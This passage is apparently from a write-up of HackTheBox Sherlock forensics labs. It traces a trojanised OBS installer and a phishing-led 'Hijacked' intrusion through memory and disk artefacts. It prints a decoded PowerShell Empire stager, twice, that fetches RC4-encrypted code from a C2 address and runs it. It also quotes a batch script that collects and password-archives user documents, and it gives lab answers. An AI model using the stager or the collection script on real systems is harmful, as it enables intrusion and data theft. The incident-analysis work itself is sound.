![image](https://hackmd.io/_uploads/r1zowGaize.png)
There also have a renamed folder under `OBS-Studio-28.1.2-Full-Installer-x64.exe`.

**Answer:** `OBS-Studio-28.1.2-Full-Installer-x64.zip`

#### 2. Simon Stark renamed the downloaded zip file to something else. What's the renamed Name of the file alongside the full path?
According to the above task:
![image](https://hackmd.io/_uploads/ryhpJQTofl.png)

**Answer:** `C:\Users\Simon.stark\Documents\Streaming Software\Obs Streaming Software.zip`

#### 3. What's the timestamp when the file was renamed?
In `$J`:
![image](https://hackmd.io/_uploads/r1Ay-XToGg.png)

**Answer:** `2023-05-05 10:22:23`

#### 4. What's the Full URL from where the software was downloaded?
Finding `Zone Id Contents` column of `Zone.Identifier`:
![image](https://hackmd.io/_uploads/BkD0QXTjMg.png)
![image](https://hackmd.io/_uploads/SJ357maife.png)

**Answer:** `http://obsproicet.net/download/v28_23/OBS-Studio-28.1.2-Full-Installer-x64.zip`

#### 5. Dig down deeper and find the IP Address on which the malicious domain was being hosted.
Check for `Archive-Microsoft-Windows-DNS-Client%4Operational-2023-05-05-10-31-18-874.evtx` and find the event whose domain is `obsproicet.net`:
![image](https://hackmd.io/_uploads/B1huFXpjfg.png)

**Answer:** `13.232.96.186`

#### 6. Multiple Source ports connected to communicate and download the malicious file from the malicious website. Answer the highest source port number from which the machine connected to the malicious website.
Check `C\Windows\System32\LogFiles\Firewall\pfirewall.log` and look for `13.232.96.186`:
![image](https://hackmd.io/_uploads/rJBLs7ajzl.png)
![image](https://hackmd.io/_uploads/BJmwsXToMe.png)
![image](https://hackmd.io/_uploads/HJqjo7Tize.png)
The highest port is `50045`.

**Answer:** `50045`

#### 7. The zip file had a malicious setup file in it which would install a piece of malware and a legit instance of OBS studio software so the user has no idea they got compromised. Find the hash of the setup file.
Beside `Desktop` and `Documents`, there is a folder containing the streaming software:
![image](https://hackmd.io/_uploads/B1X71N6izx.png)
`StrLocalGate` is the installer folder. Look at `Amcache_UnassociatedFileEntries` in `Amcache.hve`:
![image](https://hackmd.io/_uploads/BynK9wCjMx.png)
![image](https://hackmd.io/_uploads/rk9w5D0szg.png)
The first one is more suspicious than the second.

**Answer:** `35e3582a9ed14f8a4bb81fd6aca3f0009c78a3a1`

#### 8. The malicious software automatically installed a backdoor on the victim's workstation. What's the name and filepath of the backdoor?
There is a `.exe` whose filename is so weird, and its timestamp is quite close to the timestamp of malicious file.
![image](https://hackmd.io/_uploads/HkeUXOCiGl.png)
![image](https://hackmd.io/_uploads/HkTd7ORoMe.png)

**Answer:** `C:\Users\Simon.stark\Miloyeki ker konoyogi\lat takewode libigax weloj jihi quimodo datex dob cijoyi mawiropo.exe`

#### 9. Find the prefetch hash of the backdoor.
In `C:\Windows\Prefetch\`:
![image](https://hackmd.io/_uploads/Hyh-NdRoGg.png)
![image](https://hackmd.io/_uploads/H1pMSOCifx.png)

**Answer:** `D8A6D943`

#### 10. The backdoor is also used as a persistence mechanism in a stealthy manner to blend in the environment. What's the name used for persistence mechanism to make it look legit?
Open the Terminal of challenge's `C:\Windows\System32\Tasks\`, then run the below command:
``` bash
find . -type f -exec sh -c 'strings -el "$1" | grep -q "lat takewode libigax weloj jihi quimodo datex dob cijoyi mawiropo.exe" && echo "$1"' _ {} \;
```
![image](https://hackmd.io/_uploads/BkUbtOCoGx.png)
Bring up the content of `./COMSurrogate` by running `strings -el COMSurrogate`:
![image](https://hackmd.io/_uploads/ryd8KdRjGg.png)
It shows that the backdoor was ran with the highest privilege, whenever the user logs in.

**Answer:** `COMSurrogate`

#### 11. What's the bogus/invalid randomly named domain which the malware tried to reach?
In `Archive-Microsoft-Windows-DNS-Client%4Operational-2023-05-05-10-31-18-874.evtx`, look for events whose timestamp close to the time that backdoor was created:
![image](https://hackmd.io/_uploads/rJ2ppdRozl.png)

**Answer:** `8`

#### 12. The malware tried exfiltrating the data to a s3 bucket. What's the url of s3 bucket?
When searching for `s3 bucket` on the Google, I found that it relates to Amazon:
![image](https://hackmd.io/_uploads/BJaoGFRjzl.png)
Then, I found this domain:
![image](https://hackmd.io/_uploads/rkZlQKAozx.png)

**Answer:** `bbuseruploads.s3.amazonaws.com`

#### 13. What topic was simon going to stream about in week 1? Find a note or something similar and recover its content to answer the question.
I saw a `.txt` file in his `Documents`:
![image](https://hackmd.io/_uploads/ry7fVFCszl.png)
Because it is a resident file (`Resident: True`) so perhaps we can read its content.
![image](https://hackmd.io/_uploads/H1afBYAofg.png)
The topic is `Filesystem Security`.

**Answer:** `Filesystem Security`

#### 14. What's the name of Security Analyst who triaged the infected workstation?
ShellBag (in `NTUSER.DAT` and `UsrClass.dat`) record the information of how user accessed to files or folders,... I saw this in `Simon.stark_NTUSER.csv`:
![image](https://hackmd.io/_uploads/HyBhWDyhfe.png)

**Answer:** `CyberJunkie`

#### 15. What's the network path from where acquisition tools were run?
According to the above answer:
![image](https://hackmd.io/_uploads/B1HMGD12fe.png)

**Answer:** `DESKTOP-887GK2L\DESKTOP-887GK2L\Users\CyberJunkie\Desktop\Forela-Triage-Workstation\Acquisiton and Triage tools`

### XVIII. Hijacked:
> - Link lab: https://app.hackthebox.com/sherlocks/Hijacked?tab=play_sherlock
> - Đề bài:
> ![image](https://hackmd.io/_uploads/BkLxUwk3zg.png)

#### 1. What is the PID of the malicious process that gave the threat actor initial access?
Using Volatility 3 and checking for plugin `windows.pstree`, I saw this process, whose PID is `9620`:
![image](https://hackmd.io/_uploads/BJ4xiUG3ze.png)
According to [about_PowerShell_exe](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1), `-noP`, `-sta`, `-w 1`, `-enc` respectively are `-NoProfile`, `single-threaded apartment`, `-WindowStyle` and:
![image](https://hackmd.io/_uploads/H1zj28MnMe.png)
So I will decode the above base64 command as UTF-16LE format:
![image](https://hackmd.io/_uploads/rkTraUz3Gl.png)
Make it readable:
``` powershell
If($PSVersionTable.PSVersion.Major -ge 3){};
[System.Net.ServicePointManager]::Expect100Continue=0;
$wc=New-Object System.Net.WebClient;

$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwA0ADMALgAyADAANAAuADIAMgA4AC4AOQA2ADoAMgA0AA==')));
$t='/news.php';
$wc.Headers.Add('User-Agent',$u);
$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$Script:Proxy = $wc.Proxy;

$K=[System.Text.Encoding]::ASCII.GetBytes('y_NMoPemWH/&<R?4Y,7!paV%)~9bZj:J');
$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;
    $S[$_],$S[$J]=$S[$J],$S[$_]};
    $D|%{$I=($I+1)%256;
        $H=($H+$S[$I])%256;
        $S[$I],$S[$H]=$S[$H],$S[$I];
        $_-bxor$S[($S[$I]+$S[$H])%256]}};
$wc.Headers.Add("Cookie","mijBaAUUWrLhhrDE=kjV0i/ubzY9aHKpHnih78IFMdWE=");

$data=$wc.DownloadData($ser+$t);
$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX
```
Decode the base64 string in `$ser`, we get an URL of C2 server: `http://43.204.228.96:24`. The above script fake the user agent, add the session cookie, then generate an RC4 and download `http://43.204.228.96:24/news.php`, finally it decode the shell and execute it.

**Answer:** `9620`

#### 2. There is no evidence of an email client being used. Which application did Happy Grunwald use to read the emails?
When checking for `pslist`, I saw that there is a lot of procceses of `firefox.exe`, so I tried to dump the process have the most thread:
![image](https://hackmd.io/_uploads/HyzKpDfhzl.png)
Then filter some keywords related to email (like `mail`, or `@`):
![image](https://hackmd.io/_uploads/BJ8NaDM2fx.png)
![image](https://hackmd.io/_uploads/ryWGawGhGg.png)
![image](https://hackmd.io/_uploads/S1Z-Juzhze.png)
These evidence indicates that Happy Grunwald use FireFox to read his emails.

**Answer:** `firefox`

#### 3. Happy told the security team that the email was from a System Administrator, so he immediately opened the attachment. What is the email address that sent the phishing email?
Find all of email addresses existing on the FireFox's process, then count how many times each one appear:
``` ubuntu
strings -a "/mnt/c/Users/Ha Nguyen/Desktop/CTF/pid.1128.dmp" | grep -aiE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" > "/mnt/c/Users/Ha Nguyen/Desktop/CTF/emails_ascii.txt"
strings -a -el "/mnt/c/Users/Ha Nguyen/Desktop/CTF/pid.1128.dmp" | grep -aiE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" > "/mnt/c/Users/Ha Nguyen/Desktop/CTF/emails_u16.txt"
cat "/mnt/c/Users/Ha Nguyen/Desktop/CTF/emails_ascii.txt" "/mnt/c/Users/Ha Nguyen/Desktop/CTF/emails_u16.txt" | sort -u > "/mnt/c/Users/Ha Nguyen/Desktop/CTF/emails_all.txt"
cat "/mnt/c/Users/Ha Nguyen/Desktop/CTF/emails_all.txt" | grep -aoE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" | sort | uniq -c | sort -rn > "/mnt/c/Users/Ha Nguyen/Desktop/CTF/emails_count.txt"
```
``` email
25 happy.grunwald@forela.co.uk
16 webcompat@mozilla.org.xpi
16 webcompat@mozilla.org
16 default-theme@mozilla.org
14 screenshots@mozilla.org
12 google@search.mozilla.org
11 pictureinpicture@mozilla.org
11 formautofill@mozilla.org
10 wikipedia@search.mozilla.org
10 pictureinpicture@mozilla.org.xpi
10 bing@search.mozilla.org
10 amazondotcom@search.mozilla.org
10 addons-search-detection@mozilla.com
9 happy.grunwald@forela.local
9 formautofill@mozilla.org.xpi
9 ddg@search.mozilla.org
8 screenshots@mozilla.org.xpi
7 pki@sk.ee
5 icons@2x.png
5 -colorway@mozilla.org
4 webcompat-reporter@mozilla.org.xpi
4 webcompat-reporter@mozilla.org
4 translation-16@2x.png
4 toolkit@mozilla.org
4 noreply@zohoaccounts.com
4 iridium@particlecore.github.io
4 info@e-szigno.hu
4 firefox-compact-dark@mozilla.org
4 abuse@eu.zohocorp.com
4 Admins@forela.local
3 youtube-com@2x.png
3 wikipedia-org@2x.png
3 twitter-com@2x.png
3 search-engine-placeholder@2x.png
3 reddit-com@2x.png
3 olivier.debroqueville@gmail.com
3 mgxtranslator@magemagix.com
3 gtranslatewins@mozilla.org
3 google@search.mozilla.orgdefault
3 google-com@2x.png
3 geckoprofiler@mozilla.com
3 firefox-alpenglow@mozilla.org
3 facebook-com@2x.png
3 enhancerforyoutube@maximerf.addons.mozilla.org
3 duckduckgo-com@2x.svg
3 bing-com@2x.svg
3 amazon@2x.png
3 alonzo.spire@forela.co.uk
3 Administrator@forela.local
2 zhihu-com@2x.png
```
I will overlook `happy.grunwald@forela.co.uk`, `happy.grunwald@forela.local`, and strings having `@mozilla` or something likes `com@2x` or is not an email. What remains:
``` email
4 noreply@zohoaccounts.com
4 iridium@particlecore.github.io
4 abuse@eu.zohocorp.com
4 Admins@forela.local
3 olivier.debroqueville@gmail.com
3 alonzo.spire@forela.co.uk
3 Administrator@forela.local
```
Check for the data around these emails:
``` ubuntu
strings -a "/mnt/c/Users/Ha Nguyen/Desktop/CTF/pid.1128.dmp" > "/mnt/c/Users/Ha Nguyen/Desktop/CTF/strings_ascii.txt"
strings -a -el "/mnt/c/Users/Ha Nguyen/Desktop/CTF/pid.1128.dmp" > "/mnt/c/Users/Ha Nguyen/Desktop/CTF/strings_u16.txt"
```
``` ubuntu
D="/mnt/c/Users/Ha Nguyen/Desktop/CTF"
for e in "noreply@zohoaccounts.com" "iridium@particlecore.github.io" "abuse@eu.zohocorp.com" "Admins@forela.local" "olivier.debroqueville@gmail.com" "alonzo.spire@forela.co.uk" "Administrator@forela.local"; do
  f=$(echo "$e" | cut -d@ -f1)
  grep -a -F -B15 -A15 "$e" "$D/strings_u16.txt" > "$D/ctx_${f}_u16.txt"
  grep -a -F -B15 -A15 "$e" "$D/strings_ascii.txt" > "$D/ctx_${f}_ascii.txt"
done
```
We get these following files:
![image](https://hackmd.io/_uploads/ByVk9jX2fl.png)
Check for files whose size is not 0KB. In `ctx_alonzo.spire_u16.txt`:
![image](https://hackmd.io/_uploads/H1ghoom2zg.png)
There is a warning about file-downloading. So I think that this is the address of phishing email.

**Answer:** `alonzo.spire@forela.co.uk`

#### 4. What was the subject/topic of the phishing email?
Using [Bulk extractor](https://forensics.wiki/bulk_extractor/) to analyse this `.dmp` file:
![image](https://hackmd.io/_uploads/SyrNUlr2Mg.png)
![image](https://hackmd.io/_uploads/Bkq_UeH3fl.png)
There are 8960 emails here. Check the `email.txt` and filter `alonzo.spire@forela.co.uk`, I found some useful information:
![image](https://hackmd.io/_uploads/B1UGOlS2fg.png)
![image](https://hackmd.io/_uploads/r17cG-S2Mx.png)
![image](https://hackmd.io/_uploads/rkY9_ZSnMl.png)
I found the email content and the password of attachment, it's `forela1234` and `forela123`. Check for the information around `alonzo.spire@forela.co.uk`:
``` ubuntu
strings -a "$D/Dump.mem" | grep -a -B20 -A5 "alonzo.spire@forela.co.uk" | cut -c1-500 > "$D/dump_alonzo_ctx.txt"
```
![image](https://hackmd.io/_uploads/S1mPVzShMx.png)
![image](https://hackmd.io/_uploads/r16OVfH2zg.png)
I think that `Meeting with The New Operations team` is the subject of this email.

**Answer:** `Meeting with The New Operations team`

#### 5. Happy was going through a document at the time of the incident. What's the full path of the document?
Check for `pslist` to find which application can used to open a document file, I saw this process:
![image](https://hackmd.io/_uploads/S1QkmSIhfx.png)
Check for its `cmdline`:
![image](https://hackmd.io/_uploads/HkcgmrInGe.png)

**Answer:** `C:\Users\happy.grunwald\Documents\C-level\Budget-Plan_Pakistan.docx`

#### 6. Recover the document and find the Topic/heading of the document.
Finding the offset of `Budget-Plan_Pakistan.docx` by using `filescan`, then dump it:
![image](https://hackmd.io/_uploads/ryamHBLnGg.png)
Read its content:
![image](https://hackmd.io/_uploads/BJX1OrIhGg.png)
Its topic is `Budget plan For 2023-Asia Expansion`.

**Answer:** `Budget plan For 2023-Asia Expansion`

#### 7. What's the expected date of start of business in Pakistan?
According to `Budget-Plan_Pakistan.docx`:
![image](https://hackmd.io/_uploads/HJX5tHU3Gl.png)

**Answer:** `2023-09-15`

#### 8. What's the name of the malicious attachment that led to the initial infection?
We have known that the attachment is a `.zip` file, and victim downloaded and opened. There are two `WINRAR.EXE` processes, so I will check their `cmdline`:
![image](https://hackmd.io/_uploads/SJyanH82Ml.png)
The malicious attachment is `SystemHealthCheck.zip`.

**Answer:** `SystemHealthCheck.zip`

#### 9. What's the name of the malicious stager file that established C2 communication, giving the attacker a foothold?
Finding `SystemHealthCheck.zip`:
![image](https://hackmd.io/_uploads/SJ7Uf883Me.png)
There is nothing here, but we can use Bulk Extractor to find the information related to `.zip` file:
![image](https://hackmd.io/_uploads/SJDhlII2Me.png)
I found this:
![image](https://hackmd.io/_uploads/HkemGIL3zx.png)
`.hta` is an executed file:
![image](https://hackmd.io/_uploads/SkRAf8Lhzx.png)

**Answer:** `SystemHealthCheck.hta`

#### 10. To bypass email filters the attacker password protected the both of the zip files and provided the passwords to Happy. You are given the malicious attachment, but sadly Happy doesn't remember the passwords. Recover the passwords and provide them in the order given by the attacker, separated by a comma and a space.
We found it before:
![image](https://hackmd.io/_uploads/rkoAQUI3Mg.png)

**Answer:** `forela1234, forela123`

#### 11. Submit the MD5 hash of the stager file you retrieved.
The challenge gaves me `First.zip`, so I will use `forela1234` to unzip it. After extracting, we have `Second.zip`, so using `forela123` to uzip this one. Then we get the stager file:
![image](https://hackmd.io/_uploads/Hy_xrI83Ml.png)
Check its MD5 hash:
![image](https://hackmd.io/_uploads/Hyt4BL83Mx.png)

**Answer:** `dd46189c153f8e3f4d34868df3f6511f`

#### 12. Which C2 Framework was used by the attacker?
Using DIE to find the program language of this stager file:
![image](https://hackmd.io/_uploads/HyKrI8IhGl.png)
Because it was written in HTML, so we can use Notepad to read its content:
![image](https://hackmd.io/_uploads/rkJ9UUL2Ml.png)
Decode the above base64 and make it readble:
![image](https://hackmd.io/_uploads/S1j0UIIhGl.png)
It is the script that we have found in task 1! When searching for `c2 framework powershell` on Google, I found this [link](https://www.stationx.net/how-to-use-powershell-empire/):
![image](https://hackmd.io/_uploads/HkUBYIInzl.png)
![image](https://hackmd.io/_uploads/SJx_tU82Ml.png)

**Answer:** `Empire`

#### 13. What is the PID of the process the threat actor abused for privilege escalation?
On Virus Total:
![image](https://hackmd.io/_uploads/SJad0LLnGx.png)
As we can see, `svchost.exe` is an important part of these malicious process trees, but there are a lot of processes of `svchost.exe` in our challenge:
![image](https://hackmd.io/_uploads/Hynlkv8hGe.png)
Check the process tree of each `svchost.exe`, and I found these malicious processes:
![image](https://hackmd.io/_uploads/Skd_-wUnze.png)
```
svchost.exe (PID: 4352)
 └── rundll32.exe (PID: 3932)
      └── cmd.exe (PID: 3444)
           ├── TeamViewer.exe (PID: 5052)
           └── conhost.exe (PID: 8028)
```

**Answer:** `4352`

#### 14. What is the path of the malicious file that resulted in privilege escalation?
Check `cmdline` of these above proceses:
![image](https://hackmd.io/_uploads/Hk2KQPI3Gx.png)
There is nothing here. Try to find if there is malicious `.dll` file loaded by `svchost.exe` by using `dlllist` plugin:
![image](https://hackmd.io/_uploads/SyczXP8hMl.png)
There are lots of `.dll` files, but there is only one whose location is in `C:\Users\happy.grunwald\AppData\Local\Temp\`:
![image](https://hackmd.io/_uploads/rJQPQPUnMl.png)
The malicious file is `Winsrvc.dll`.

**Answer:** `C:\Users\happy.grunwald\AppData\Local\Temp\Winsrvc.dll`

#### 15. What is the Mitre sub-technique ID with which the attacker escalated their privileges?
I found this MITRE:
![image](https://hackmd.io/_uploads/ByPkOwIhMx.png)
![image](https://hackmd.io/_uploads/r1U7wPU2Ge.png)
More information: https://attack.mitre.org/techniques/T1055/001/

**Answer:** `T1055.001`

#### 16. The attacker connected to 2 different C2 addresses. What was the C2 IP and port number pair which facilitated initial remote access to the threat actor?
We have found the reverse shell in task 1:
``` powersell
If($PSVersionTable.PSVersion.Major -ge 3){};
[System.Net.ServicePointManager]::Expect100Continue=0;
$wc=New-Object System.Net.WebClient;

$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwA0ADMALgAyADAANAAuADIAMgA4AC4AOQA2ADoAMgA0AA==')));
$t='/news.php';
$wc.Headers.Add('User-Agent',$u);
$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$Script:Proxy = $wc.Proxy;

$K=[System.Text.Encoding]::ASCII.GetBytes('y_NMoPemWH/&<R?4Y,7!paV%)~9bZj:J');
$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;
    $S[$_],$S[$J]=$S[$J],$S[$_]};
    $D|%{$I=($I+1)%256;
        $H=($H+$S[$I])%256;
        $S[$I],$S[$H]=$S[$H],$S[$I];
        $_-bxor$S[($S[$I]+$S[$H])%256]}};
$wc.Headers.Add("Cookie","mijBaAUUWrLhhrDE=kjV0i/ubzY9aHKpHnih78IFMdWE=");

$data=$wc.DownloadData($ser+$t);
$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX
```
**Answer:** `43.204.228.96:24`

#### 17. Hunt for the second C2 Address to which connection was made by a LOLBIN after escalating privileges.
Find and dump `Winsrvc.dll` file:
![image](https://hackmd.io/_uploads/SJ2SFDI3zx.png)
![image](https://hackmd.io/_uploads/BkDLKDU2Ge.png)
Its psecode:
![image](https://hackmd.io/_uploads/r1lkgzjw2Gl.png)
![image](https://hackmd.io/_uploads/SkngGjwnzg.png)
![image](https://hackmd.io/_uploads/S1H-GsPhfe.png)
![image](https://hackmd.io/_uploads/r1YMfjD3fg.png)
This script used for Process Injection, in general, it will execute a shellcode in `&unk_7FF834F83000`:
![image](https://hackmd.io/_uploads/rJxnziv3fe.png)
Because we know `rundll32.exe` (PID: `3932`) is the DLL injection process, let's check if there has malware in this process:
![image](https://hackmd.io/_uploads/SkPAmjwhGl.png)
![image](https://hackmd.io/_uploads/S11eEjvnfe.png)
There are two `PrivateMemory` having suspicious privilege: `PAGE_EXECUTE_READWRITE`; and I suscessfully dumped the two files of these memory areas.
![image](https://hackmd.io/_uploads/rk2TEiv2Gl.png)
The port is `4444` (such a beautiful and suspicious number). Beside that, if checking for `netscan` plugin, I found this malicious connect:
![image](https://hackmd.io/_uploads/HkBJxiwnMl.png)
This connection belongs to `rundll32.exe`, which is a part of privilege-escalating.

**Answer:** `13.233.33.88:4444`

#### 18. The attacker directly downloaded a script from a web server. What is the full URL from where it was downloaded?
I thought the answer is `http://43.204.228.96:24/news.php`, but it was wrong. So Dump `3932` process and check if there is any link which contain `18.192.12.126` in its URL:
![image](https://hackmd.io/_uploads/rJUKKhDnMx.png)
We have to use `-el` because memory stores data in little-edian. Beside that:
![image](https://hackmd.io/_uploads/HyeBD3D3Gx.png)
But I cannot dump this file:
![image](https://hackmd.io/_uploads/r1wMw2whfe.png)

**Answer:** `http://13.127.18.201/SystemIntegrityCheck.bat`

#### 19. The threat actor that performed the attack is known for automating the collection of documents and files from compromised systems. The threat actor named their operation against Forela "PK-OPR24." Our reverse engineer said that she found this string commented on multiple occurrences in the analysis of the malicious stager. Reverse the script and provide the file extensions that it collects, in the order they are presented in the code.
Filter `PK-OPR24`, I have found some offsets containing this keyword:
![image](https://hackmd.io/_uploads/B14ZMv5hGg.png)
Check for lines around the first offset:
![image](https://hackmd.io/_uploads/HkgyXv9hzx.png)
This is a `.bat` script. Expand the information area to display full script:
![image](https://hackmd.io/_uploads/r1YwXD9nMg.png)
``` bat
set "source=%userprofile%"
set "destination=%temp%\LootDocs"
#PK-OPR24
if not exist "%destination%" mkdir "%destination%"
for /r "%source%" %%a in (*.docx *.docm *.pdf *.xls *.txt *.ppt *.xlsx *.pptx) do (
    copy "%%a" "%destination%"
cd %TEMP%\LootDocs
"C:\Program Files\WinRAR\Rar.exe" a Data -p rwajnkhgbdtyalmd
pause
```
The document was copied to `%temp%\LootDocs`, then it was archived by `Rar.exe` with `rwajnkhgbdtyalmd` is the password. And these are some of documents in this archived file:
![image](https://hackmd.io/_uploads/r1O4HPq3zl.png)

**Answer:** `docx, docm, pdf, xls, txt, ppt, xlsx, pptx`

#### 20. The threat actor archived the collected data using tools like WinRAR, RAR, etc., before exfiltrating it. What is the password with which the TA archived the collected data?
According to the above task, we found that the password of the archived file is `rwajnkhgbdtyalmd`.

**Answer:** `rwajnkhgbdtyalmd`

#### 21. The threat actor is known to set up and use Remote Access tools. Which tool did the attacker set up for Persistence?
According to task 13, we have this process tree:
```
svchost.exe (PID: 4352)
 └── rundll32.exe (PID: 3932)
      └── cmd.exe (PID: 3444)
           ├── TeamViewer.exe (PID: 5052)
           └── conhost.exe (PID: 8028)
```
`TeamViewer.exe` is a famous remote access tool:
![image](https://hackmd.io/_uploads/rkGuM9o3Ml.png)

**Answer:** `TeamViewer`

#### 22. The threat actor created a backdoor user to establish a backup persistence mechanism. What are the credentials of this account?
Check for all accounts existing on the computer:
![image](https://hackmd.io/_uploads/Sk_c8co2fg.png)
According to [Wikipedia](https://en.wikipedia.org/wiki/Security_Identifier), the RID RIDs greater than 1000 indicate an admin-defined principal. In the above picture, maybe `helpdesk` is the backdoor account. Using `hashcat` to crack the password of this account:
![image](https://hackmd.io/_uploads/B1DPxoihMg.png)
The password is `BILA@hud`.

**Answer:** `helpdesk:BILA@hud`

#### 23. What Threat Actor seems to be in question? External Research is required, so keep in mind things like some of the techniques you identified so far, the Region in which they operate, etc.
Looking for `Pakistan` on MITRE:
![image](https://hackmd.io/_uploads/SJkSSiohfl.png)
![image](https://hackmd.io/_uploads/SyFnEoi2Gg.png)
![image](https://hackmd.io/_uploads/BJGaEishze.png)
![image](https://hackmd.io/_uploads/S1_xHoshGx.png)
![image](https://hackmd.io/_uploads/HkvfSsonzl.png)

**Answer:** `Mustang Panda`
